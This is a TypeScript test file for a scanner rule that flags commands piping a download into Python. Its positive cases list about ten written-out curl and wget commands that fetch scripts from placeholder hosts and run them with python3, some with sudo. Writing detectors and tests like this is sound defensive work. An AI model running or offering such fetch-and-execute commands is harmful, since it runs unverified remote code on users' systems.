import { describe, it, expect } from 'vitest';
import { scanWithPatterns } from './pattern-engine.js';

const cp003 = (line: string) => scanWithPatterns(line).some(m => m.description === 'Curl-pipe-python execution');

describe('CP-003 curl-pipe-python (dt13 RG3)', () => {
  it.each([
    'curl -s http://dl.example.com/a.py | env python3',
    'curl -s http://dl.example.com/a.py | python3 - --install',
    'curl -fsSL https://raw.githubusercontent.com/someone/x/main/i.py | python3 -',
    'curl -s http://dl.example.com/a.py | python3 -c "import sys;exec(sys.stdin.read())"',
    'curl -s https://x.example/a | python3 -c "import sys; exec(sys.stdin.read())"',
    'curl -s http://dl.example.com/a.py | python3 /dev/stdin',
    'wget -qO- http://dl.example.com/a.py | python3',
    'curl -sL https://x.example/a.py | sudo python3',
    'curl -s http://dl.example.com/a.py | python3',
    'curl -sSL https://install.python-poetry.org | python3 - --version 1.2',
  ])('fires when Python runs the download: %s', (line) => {
    expect(cp003(line)).toBe(true);
  });

  it.each([
    'curl -s https://api.example.com/data | python3 -m json.tool',
    'curl -s https://api.example.com/data | python3 -c "import json,sys; print(json.load(sys.stdin))"',
    'curl -s https://api.example.com/data | python3 parse.py',
  ])('stays clean when Python reads the download as data: %s', (line) => {
    expect(cp003(line)).toBe(false);
  });
});
